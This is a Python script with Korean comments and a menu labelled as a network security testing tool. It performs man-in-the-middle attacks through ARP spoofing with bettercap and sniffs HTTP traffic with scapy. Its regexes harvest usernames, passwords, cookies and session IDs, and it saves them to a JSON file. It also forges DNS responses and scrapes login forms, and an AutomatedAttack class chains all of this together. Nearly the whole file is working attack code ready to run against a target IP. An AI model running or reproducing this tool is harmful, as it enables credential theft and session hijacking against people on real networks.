#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
from scapy.all import *
import re
import json
from datetime import datetime

class NetworkSniffer:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.captured_data = {
            "credentials": [],
            "cookies": [],
            "sessions": []
        }
        
    def start_arp_spoofing(self, target_ip, gateway_ip):
        """ARP 스푸핑 시작"""
        print(f"[*] Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
        
        # IP 포워딩 활성화
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Bettercap을 사용한 ARP 스푸핑
        cmd = f"""
        sudo bettercap -iface {self.interface} -eval "
        set arp.spoof.targets {target_ip}
        arp.spoof on
        net.sniff on
        "
        """
        
        # 백그라운드에서 실행
        subprocess.Popen(cmd, shell=True)
        
    def capture_http_data(self, packet):
        """HTTP 패킷에서 민감한 데이터 추출"""
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                load = packet[Raw].load.decode('utf-8', 'ignore')
                
                # POST 요청에서 로그인 정보 찾기
                if "POST" in load:
                    # 일반적인 로그인 패턴
                    patterns = [
                        r'username=([^&\s]+)',
                        r'password=([^&\s]+)',
                        r'email=([^&\s]+)',
                        r'user=([^&\s]+)',
                        r'pass=([^&\s]+)'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, load, re.IGNORECASE)
                        if matches:
                            cred_info = {
                                "timestamp": datetime.now().isoformat(),
                                "source_ip": packet[IP].src if packet.haslayer(IP) else "Unknown",
                                "dest_ip": packet[IP].dst if packet.haslayer(IP) else "Unknown",
                                "data": matches[0],
                                "pattern": pattern
                            }
                            self.captured_data["credentials"].append(cred_info)
                            print(f"[+] Credential found: {cred_info}")
                
                # 쿠키 추출
                cookie_match = re.search(r'Cookie:\s*(.+?)(?:\r\n|$)', load)
                if cookie_match:
                    cookie_info = {
                        "timestamp": datetime.now().isoformat(),
                        "source_ip": packet[IP].src if packet.haslayer(IP) else "Unknown",
                        "cookies": cookie_match.group(1)
                    }
                    self.captured_data["cookies"].append(cookie_info)
                    print(f"[+] Cookie captured: {cookie_info['cookies'][:50]}...")
                    
                # 세션 ID 패턴
                session_patterns = [
                    r'PHPSESSID=([a-zA-Z0-9]+)',
                    r'JSESSIONID=([a-zA-Z0-9]+)',
                    r'session_id=([a-zA-Z0-9]+)',
                    r'sid=([a-zA-Z0-9]+)'
                ]
                
                for pattern in session_patterns:
                    session_match = re.search(pattern, load)
                    if session_match:
                        session_info = {
                            "timestamp": datetime.now().isoformat(),
                            "source_ip": packet[IP].src if packet.haslayer(IP) else "Unknown",
                            "session_type": pattern.split('=')[0],
                            "session_id": session_match.group(1)
                        }
                        self.captured_data["sessions"].append(session_info)
                        print(f"[+] Session captured: {session_info}")
                        
            except Exception as e:
                pass
    
    def start_packet_capture(self):
        """Scapy를 사용한 패킷 캡처 시작"""
        print(f"[*] Starting packet capture on {self.interface}")
        sniff(iface=self.interface, 
              filter="tcp port 80 or tcp port 8080", 
              prn=self.capture_http_data,
              store=0)
    
    def start_wireshark_capture(self, output_file="capture.pcap"):
        """Wireshark/tshark를 사용한 백그라운드 캡처"""
        print(f"[*] Starting tshark capture to {output_file}")
        cmd = f"sudo tshark -i {self.interface} -w {output_file} -f 'tcp port 80'"
        subprocess.Popen(cmd, shell=True)
    
    def analyze_pcap_file(self, pcap_file):
        """저장된 PCAP 파일 분석"""
        print(f"[*] Analyzing {pcap_file}")
        
        # tshark를 사용한 HTTP 데이터 추출
        cmd = f"tshark -r {pcap_file} -Y 'http.request.method == POST' -T fields -e ip.src -e ip.dst -e http.request.uri -e http.file_data"
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.stdout:
            print("[+] POST requests found:")
            print(result.stdout)
    
    def save_results(self, filename="captured_data.json"):
        """캡처된 데이터를 JSON 파일로 저장"""
        with open(filename, 'w') as f:
            json.dump(self.captured_data, f, indent=4)
        print(f"[*] Results saved to {filename}")

class AutomatedAttack:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.sniffer = NetworkSniffer(interface)
        
    def run_full_attack(self):
        """전체 공격 시나리오 실행"""
        print("[*] Starting automated attack sequence...")
        
        # 1. ARP 스푸핑 시작
        self.sniffer.start_arp_spoofing(self.target_ip, self.gateway_ip)
        time.sleep(3)
        
        # 2. Wireshark 백그라운드 캡처 시작
        wireshark_thread = threading.Thread(
            target=self.sniffer.start_wireshark_capture
        )
        wireshark_thread.daemon = True
        wireshark_thread.start()
        
        # 3. 실시간 패킷 스니핑 시작
        try:
            self.sniffer.start_packet_capture()
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            self.cleanup()
            
    def cleanup(self):
        """공격 종료 및 정리"""
        # ARP 테이블 복구
        os.system("killall bettercap 2>/dev/null")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        # 결과 저장
        self.sniffer.save_results()
        
        # PCAP 파일 분석
        if os.path.exists("capture.pcap"):
            self.sniffer.analyze_pcap_file("capture.pcap")

# 추가 유틸리티 함수들
def dns_spoof(target_domain, fake_ip):
    """DNS 스푸핑 함수"""
    def process_packet(packet):
        if packet.haslayer(DNSQR) and target_domain in packet[DNSQR].qname.decode():
            print(f"[*] Spoofing DNS request for {target_domain}")
            
            # DNS 응답 생성
            spoofed = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                     UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                     DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                         an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_ip))
            
            send(spoofed, verbose=0)
            
    sniff(filter="udp port 53", prn=process_packet)

def extract_forms(url):
    """웹 페이지에서 로그인 폼 찾기"""
    import requests
    from bs4 import BeautifulSoup
    
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        login_forms = []
        
        for form in forms:
            inputs = form.find_all('input')
            for inp in inputs:
                if inp.get('type') in ['password', 'email'] or \
                   inp.get('name') in ['username', 'user', 'login']:
                    login_forms.append({
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET'),
                        'inputs': [{'name': i.get('name'), 'type': i.get('type')} 
                                  for i in inputs]
                    })
                    break
        
        return login_forms
        
    except Exception as e:
        print(f"Error: {e}")
        return []

# 메인 실행 스크립트
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)
    
    # 사용 예시
    print("""
    Network Security Testing Tool
    ============================
    1. Basic packet sniffing
    2. ARP spoofing + sniffing
    3. Analyze PCAP file
    4. DNS spoofing
    5. Find login forms
    """)
    
    choice = input("Select option: ")
    
    if choice == "1":
        sniffer = NetworkSniffer("eth0")
        sniffer.start_packet_capture()
        
    elif choice == "2":
        target = input("Target IP: ")
        gateway = input("Gateway IP: ")
        attack = AutomatedAttack(target, gateway)
        attack.run_full_attack()
        
    elif choice == "3":
        pcap_file = input("PCAP file path: ")
        sniffer = NetworkSniffer()
        sniffer.analyze_pcap_file(pcap_file)
        
    elif choice == "4":
        domain = input("Target domain: ")
        fake_ip = input("Fake IP: ")
        dns_spoof(domain, fake_ip)
        
    elif choice == "5":
        url = input("Target URL: ")
        forms = extract_forms(url)
        print(f"Found {len(forms)} login forms:")
        for form in forms:
            print(json.dumps(form, indent=2))